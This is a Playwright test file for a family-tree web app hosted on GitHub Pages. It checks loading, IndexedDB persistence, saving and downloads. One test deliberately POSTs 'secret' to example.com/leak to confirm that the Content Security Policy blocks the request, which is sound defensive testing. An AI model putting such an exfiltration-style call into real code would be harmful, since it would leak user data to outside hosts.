import { test, expect } from './fixtures';

// GEN-09: the same file served from GitHub Pages. The fixture answers the https address inside the browser,
// so these tests run on a real web origin without a server, and still fail on any other request.
test.describe('app served from a website (GitHub Pages)', () => {
  test('starts, shows the example and keeps it after a reload', async ({ app, page }) => {
    await app.openHosted();
    await page.getByRole('button', { name: 'Beispiel ansehen' }).click();
    await expect(page.locator('.card[data-id="p_karl"]')).toBeVisible();
    // The working copy lives in the browser for this website, like for a local file.
    await expect
      .poll(() => page.evaluate(async () => (await indexedDB.databases()).map((d) => d.name)))
      .toContain('stammbaum');
    await app.reload();
    await expect(page.locator('.card[data-id="p_karl"]')).toBeVisible();
  });

  test('the browser still blocks every network request (CSP)', async ({ app, page }) => {
    await app.openHosted();
    const outcome = await page.evaluate(async () => {
      const violation = new Promise<string>((resolve) =>
        document.addEventListener('securitypolicyviolation', (e) => resolve(e.effectiveDirective)),
      );
      try {
        await fetch('https://example.com/leak', { method: 'POST', body: 'secret' });
        return { sent: true, directive: '' };
      } catch {
        return { sent: false, directive: await violation };
      }
    });
    expect(outcome).toEqual({ sent: false, directive: 'connect-src' });
    app.consoleErrors.length = 0; // the browser reports the blocked request as an error, expected here
  });

  test('Chrome/Edge can save into the file, other browsers download it', async ({
    app,
    page,
    browserName,
  }) => {
    await app.openHosted();
    const saveInPlace = await page.evaluate(
      () => window.isSecureContext && 'showSaveFilePicker' in window,
    );
    expect(saveInPlace).toBe(browserName === 'chromium');
    if (browserName === 'chromium') return;
    await page.getByRole('button', { name: 'Beispiel ansehen' }).click();
    const [download] = await Promise.all([
      page.waitForEvent('download'),
      page.getByRole('button', { name: 'Speichern', exact: true }).click(),
    ]);
    expect(download.suggestedFilename()).toMatch(/^Familie[ _]Brandt\.stammbaum$/);
  });
});
